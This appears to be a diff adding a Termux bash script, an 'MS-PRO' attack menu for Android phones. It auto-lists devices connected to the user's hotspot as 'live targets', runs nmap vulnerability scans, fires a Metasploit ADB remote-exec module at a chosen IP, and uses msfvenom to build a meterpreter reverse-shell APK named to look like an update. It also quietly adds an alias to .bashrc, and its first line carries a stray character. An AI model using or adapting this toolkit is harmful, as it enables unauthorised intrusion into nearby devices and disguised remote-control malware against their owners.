@@ -1,0 +1,90 @@
+c#!/data/data/com.termux/files/usr/bin/bash
+
+# --- COLORS ---
+R='\033[1;31m'
+G='\033[1;32m'
+Y='\033[1;33m'
+B='\033[1;34m'
+W='\033[1;37m'
+C='\033[1;36m'
+NC='\033[0m'
+
+# --- AUTO-ALIAS ---
+if ! grep -q "alias ms=" ~/.bashrc; then
+    echo "alias ms='bash $HOME/ms.sh'" >> ~/.bashrc
+fi
+
+# --- CORE FUNCTIONS ---
+header() {
+    clear
+    echo -e "${R}  __  __  _____      ██████╗ ██████╗  ██████╗ "
+    echo -e "${R} |  \/  |/ ____|     ██╔══██╗██╔══██╗██╔═══██╗"
+    echo -e "${R} | \  / | (___       ██████╔╝██████╔╝██║   ██║"
+    echo -e "${R} | |\/| |\___ \      ██╔═══╝ ██╔══██╗██║   ██║"
+    echo -e "${R} | |  | |____) |     ██║     ██║  ██║╚██████╔╝"
+    echo -e "${R} |_|  |_|_____/      ╚═╝     ╚═╝  ╚═╝ ╚═════╝ "
+    echo -e "${W}          [ J A A F A R I   SYSTEMS ]"
+    echo -e "${C}====================================================${NC}"
+    
+    # Automatic IP Discovery for Hotspot
+    echo -e "${Y}[*] AUTO-SCANNING CONNECTED DEVICES...${NC}"
+    # This command finds IPs automatically
+    DEVICES=$(arp -a | grep -v "incomplete" | awk '{print $2}' | tr -d '()')
+    
+    if [ -z "$DEVICES" ]; then
+        echo -e "${R}[!] NO DEVICES DETECTED ON HOTSPOT${NC}"
+    else
+        echo -e "${G}[+] LIVE TARGETS FOUND:${NC}"
+        echo -e "${W}$DEVICES${NC}"
+    fi
+    echo -e "${C}====================================================${NC}"
+}
+
+# --- MAIN ENGINE ---
+while true; do
+    header
+    echo -e "${G}1. ${W}DEEP VULNERABILITY SCAN (NMAP-VULN)"
+    echo -e "${G}2. ${W}AUTO-EXPLOIT (ADB/METASPLOIT)"
+    echo -e "${G}3. ${W}LAUNCH METASPLOIT CONSOLE"
+    echo -e "${G}4. ${W}GENERATE ANDROID PAYLOAD"
+    echo -e "${G}5. ${W}EXIT"
+    echo ""
+    read -p "MS-PRO >> " choice
+
+    case $choice in
+        1)
+            read -p "ENTER TARGET IP: " target
+            echo -e "${R}[!] ANALYZING VULNERABILITIES ON $target...${NC}"
+            nmap -sV --script=vuln $target
+            read -p "Press Enter..."
+            ;;
+        2)
+            read -p "ENTER TARGET IP: " target
+            echo -e "${R}[!] ATTEMPTING AUTO-EXPLOIT ON $target...${NC}"
+            # Automated ADB Exploit via Metasploit
+            msfconsole -q -x "use auxiliary/scanner/adb/adb_server_exec; set RHOSTS $target; run; exit"
+            read -p "Press Enter..."
+            ;;
+        3)
+            echo -e "${B}[*] INITIALIZING MSFCONSOLE...${NC}"
+            msfconsole
+            ;;
+        4)
+            read -p "ENTER YOUR IP (LHOST): " lhost
+            read -p "ENTER PORT (LPORT): " lport
+            echo -e "${Y}[*] BUILDING INFECTED APK...${NC}"
+            msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $HOME/jaafari_update.apk
+            echo -e "${G}[+] PAYLOAD SAVED TO: $HOME/jaafari_update.apk${NC}"
+            read -p "Press Enter..."
+            ;;
+        5)
+            echo -e "${R}SHUTTING DOWN...${NC}"
+            break
+            ;;
+        *)
+            echo -e "${R}INVALID SELECTION${NC}"
+            sleep 1
+            ;;
+    esac
+done
+
